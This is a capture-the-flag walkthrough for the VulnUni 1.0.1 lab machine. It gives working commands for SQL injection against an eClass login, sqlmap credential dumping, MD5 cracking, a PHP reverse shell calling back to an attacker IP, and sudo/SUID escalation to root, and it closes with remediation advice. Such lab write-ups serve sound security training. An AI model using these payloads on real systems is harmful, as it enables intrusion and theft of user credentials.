# VulnUni: 1.0.1 — Class is in Session, and SQL Injection is the Curriculum

Alright guys!! VulnUni runs an eClass open-source e-learning platform, and the login form is a SQL injection textbook exercise. You enumerate the database, dump admin hashes, crack them, log into the admin panel, upload a PHP reverse shell as a course file, and then escalate via SUID or sudo misconfiguration to root. The machine teaches you exactly what happens when academic platforms skip input validation: the attacker gets an A+ in database exfiltration. Dude, this one is legit educational in every sense.

| Field | Value |
|---|---|
| **Level** | Easy/Medium |
| **Target VM** | VulnUni: 1.0.1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/vulnuni-101,439/ |
| **Techniques** | Host discovery, nmap enumeration, eClass web application fingerprinting, SQL injection (sqlmap), MD5 hash cracking, authenticated PHP file upload, reverse shell, SUID/sudo privilege escalation |
| **CVEs** | CWE-89 (SQL injection in eClass login), CWE-434 (unrestricted file upload via authenticated eClass admin), CWE-326 (MD5 password hashing without salt), CWE-269 (sudo/SUID misconfiguration) |
| **APT Groups** | APT41 — targets education sector via SQL injection and credential theft; multiple ransomware groups exploit CMS SQL injection as an automated initial access technique |

---

## Attack Summary

```
netdiscover → nmap → HTTP 80 (eClass LMS)
  → dirb/gobuster enumeration
  → eClass login: SQL injection in username field
  → sqlmap: enumerate DBs → eclass DB → user table → dump admin hash
  → hashcat -m 0 (MD5) → plaintext password
  → eClass admin login → course file upload → shell.php
  → nc -lvnp 4444 → browse to upload path → reverse shell (www-data)
  → python pty → stable shell
  → sudo -l or find SUID → GTFOBins escalation
  → root flag
```

---

## Methodology

1. Host discovery and full port scan
2. Web application fingerprinting: eClass LMS identification
3. Directory enumeration with dirb/gobuster
4. SQL injection testing in eClass login form
5. Automated credential extraction with sqlmap
6. MD5 hash cracking with hashcat
7. Authenticated file upload via eClass admin panel
8. PHP reverse shell trigger and shell stabilization
9. Privilege escalation enumeration and exploitation
10. Root flag capture

---

## Step 1 — Host Discovery

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.TARGET
```

Identify the target from MAC address vendor or by process of elimination on the subnet.

**MITRE ATT&CK:** T1040 — Network Sniffing (passive discovery)

---

## Step 2 — Port Scan and Service Fingerprinting

```bash
nmap -A -p- 192.168.1.TARGET
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.x
22/tcp open  ssh     OpenSSH 7.x (may be present)
```

Open port 80 hosts the eClass LMS. The machine is web-centric. Identify the eClass version from page source footer or the `/CHANGES` file:

```bash
curl -s http://192.168.1.TARGET/CHANGES | head -20
curl -s http://192.168.1.TARGET/ | grep -i "eclass\|version"
```

**MITRE ATT&CK:** T1046 — Network Service Discovery; T1592.002 — Gather Victim Host Information: Software

---

## Step 3 — Web Application Enumeration

```bash
dirb http://192.168.1.TARGET /usr/share/wordlists/dirb/common.txt
# Or:
gobuster dir \
  -u http://192.168.1.TARGET \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,html \
  -t 30
```

Key paths in eClass:

```
/modules/auth/index.php    → login form (SQL injection target)
/courses/                  → course directory (file upload destination)
/admin/                    → administrative interface
/include/                  → application configuration files
```

Browse the login form at `/modules/auth/index.php`. Test the username field manually:

```
admin'--
admin' OR '1'='1
```

A blank page or error message instead of "invalid credentials" confirms SQL injection.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 4 — SQL Injection: Credential Extraction with sqlmap

Identify the exact POST parameters by capturing the login request (Burp Suite or browser dev tools):

```
POST /modules/auth/index.php
username=admin&password=test&submit=Login
```

Run sqlmap against the username parameter:

```bash
sqlmap -u "http://192.168.1.TARGET/modules/auth/index.php" \
       --data="username=admin&password=test&submit=Login" \
       --dbs \
       --batch
```

Enumerate the eclass database:

```bash
sqlmap -u "http://192.168.1.TARGET/modules/auth/index.php" \
       --data="username=admin&password=test&submit=Login" \
       -D eclass --tables \
       --batch
```

Dump the user table:

```bash
sqlmap -u "http://192.168.1.TARGET/modules/auth/index.php" \
       --data="username=admin&password=test&submit=Login" \
       -D eclass -T user --dump \
       --batch
```

Result:

```
admin : [MD5_HASH]
```

**Real-world note:** SQL injection in LMS and educational portal login forms is consistently found in assessments of universities and school districts. The eClass platform (and similar products like Moodle, OpenedX) have historically had multiple SQLi vulnerabilities. Academic institutions lag behind enterprise patch cycles by months to years.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1552.001 — Credentials in Files

---

## Step 5 — Crack MD5 Password Hash

```bash
echo "[MD5_HASH]" > /tmp/hash.txt
hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --show
# Or:
hashcat -m 0 -d 1 -w 3 -O /tmp/hash.txt /usr/share/wordlists/rockyou.txt
```

Check potfile after run:

```bash
hashcat -m 0 /tmp/hash.txt --show
```

MD5 is a fast hash: modern GPUs crack billions of MD5 hashes per second. A typical 8-character password from rockyou.txt falls in seconds.

**Alternative with john:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 /tmp/hash.txt
john --show --format=raw-md5 /tmp/hash.txt
```

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking

---

## Step 6 — Authenticated File Upload for Reverse Shell

Log into eClass admin panel with the cracked credentials. Navigate to course administration:

```
Dashboard → Courses → [Select any course] → Course Material → Upload
```

Prepare the PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit /tmp/shell.php:
# $ip = '192.168.1.ATTACKER';
# $port = 4444;
```

Upload `shell.php` through the course material upload interface. eClass stores uploads in:

```
/courses/tmpUnzipping/[session_id]/
/courses/[course_code]/work/
```

Check the response source for the uploaded file path, or enumerate:

```bash
curl -s http://192.168.1.TARGET/courses/ | grep -i "shell\|php"
gobuster dir -u http://192.168.1.TARGET/courses/ -w /usr/share/wordlists/dirb/common.txt
```

**MITRE ATT&CK:** T1105 — Ingress Tool Transfer; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 7 — Trigger Reverse Shell and Stabilize

Start the listener:

```bash
nc -lvnp 4444
```

Trigger the shell:

```bash
curl http://192.168.1.TARGET/courses/[path]/shell.php
```

The shell arrives as `www-data`. Stabilize immediately:

```bash
# On target:
python -c 'import pty; pty.spawn("/bin/bash")'
# Or python3:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# Press Ctrl+Z on attacker, then:
stty raw -echo; fg
# Press Enter twice
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 8 — Privilege Escalation

Enumerate all vectors:

```bash
# Sudo rights
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Kernel version
uname -a
```

**Common escalation paths for eClass machines:**

Path A (sudo misconfiguration):

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/bash")'
```

Path B (SUID python/perl):

```bash
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
# /usr/bin/python (SUID)
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Path C (kernel exploit, older Ubuntu):

```bash
uname -a
# Ubuntu 14.04/16.04 → check CVE-2015-1328 (overlayfs), CVE-2016-5195 (DirtyCow)
searchsploit ubuntu 14.04 privilege
```

```bash
id
# uid=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. Class dismissed. gg

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Notes |
|---|---|---|---|
| Admin hash | (MD5 from sqlmap) | eclass DB, user table | MD5, no salt |
| Admin plaintext | (cracked from hash) | hashcat + rockyou | Used for eClass login |
| Root flag | (varies per instance) | /root/flag.txt | After privesc |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SQL injection in eClass login bypasses authentication and exposes all user credentials | eClass, Moodle, and similar platforms have historically had SQLi; academic institutions are prime targets for credential theft | Use parameterized queries everywhere; never concatenate user input into SQL |
| 2 | MD5 without salt for password storage | MD5 is cryptographically broken for password storage; GPU attacks exhaust rockyou in seconds | Use bcrypt, argon2, or scrypt; enforce minimum salt rounds |
| 3 | Authenticated file upload executes arbitrary PHP | Any authenticated admin can upload a PHP reverse shell; this is standard post-auth exploitation | Validate file type by MIME, extension, and magic bytes; store uploads outside web root; disable PHP handler in upload directories |
| 4 | Sudo/SUID misconfiguration enables instant root | Overly broad sudo grants or SUID on scripting interpreters eliminate the privilege escalation barrier | Audit sudoers; remove SUID from non-essential interpreters; apply least privilege |
| 5 | Education sector as high-value target | Universities and schools host research data, PII of students and staff, and financial data; patch cycles are slower than enterprise | Implement vulnerability management programs; prioritize internet-facing application patching |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Software Discovery | T1592.002 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Password Cracking | T1110.002 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Remediation and Containment

### Technical Fixes

1. **Fix SQL injection**: replace string concatenation in eClass login with PDO prepared statements; parameterize all user-supplied input
2. **Upgrade password hashing**: migrate from MD5 to bcrypt (cost factor 12+) or argon2id; force password reset for all users
3. **Restrict file upload**: validate MIME type, extension, and magic bytes server-side; store uploads outside web root; configure web server to deny PHP execution in course material directories
4. **Audit sudo and SUID**: remove NOPASSWD grants; revoke SUID from non-essential binaries
5. **Patch eClass**: update to the latest version; subscribe to security advisories; test upgrades in a staging environment before production
6. **Network segmentation**: isolate the LMS from internal networks; apply WAF rules for SQL injection patterns

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all LMS instances and versions; assess patch status |
| Protect | Access Control | Fix SQL injection; restrict file uploads; disable PHP in upload dirs |
| Protect | Data Security | Migrate to bcrypt for password storage; encrypt sensitive data at rest |
| Detect | Anomalies and Events | Deploy WAF; alert on sqlmap user-agent patterns and bulk SQL queries |
| Respond | Response Planning | Rotate all credentials exposed via SQL injection |
| Recover | Recovery Planning | Rebuild if webshell present; audit all uploaded files |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict file upload paths; deny PHP execution in upload dirs |
| IA-5 | Authenticator Management | Migrate from MD5 to bcrypt; enforce password complexity |
| SA-11 | Developer Testing and Evaluation | Add SQL injection to SAST/DAST pipeline for LMS deployments |
| SI-10 | Information Input Validation | Parameterize all database queries; validate and sanitize all user input |
| CM-7 | Least Functionality | Disable PHP handler in upload directories |

### CISA KEV

SQL injection in CMS and LMS platforms is documented in multiple CISA advisories. The combination of SQLi, credential theft, and file upload RCE maps directly to techniques used in attacks on education sector organizations documented in CISA/FBI joint advisory AA22-074A.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Credentials and Authentication | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Situational Awareness (SA) | Monitor Logs and Events | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (parameterized queries; file upload restrictions)
- **D3-HBPI** — Harden Build Pipeline Integrity (SAST for SQLi in LMS codebase)
- **D3-OAM** — Operating System Administrative Management (sudo hardening; SUID auditing)

---

## Final Thoughts

VulnUni: 1.0.1 is an excellent machine for practicing a complete, realistic web application attack chain. SQL injection to credential theft to authenticated file upload to privilege escalation: this is the exact sequence documented in real-world LMS compromises. The education sector is consistently among the top-targeted industries precisely because institutions like this one run unpatched software with weak credentials on public-facing servers.

The irony of a "university" machine where SQL injection is the primary lesson is not lost on anyone. Class dismissed.

Thanks guys!! (❍ᴥ❍ʋ)
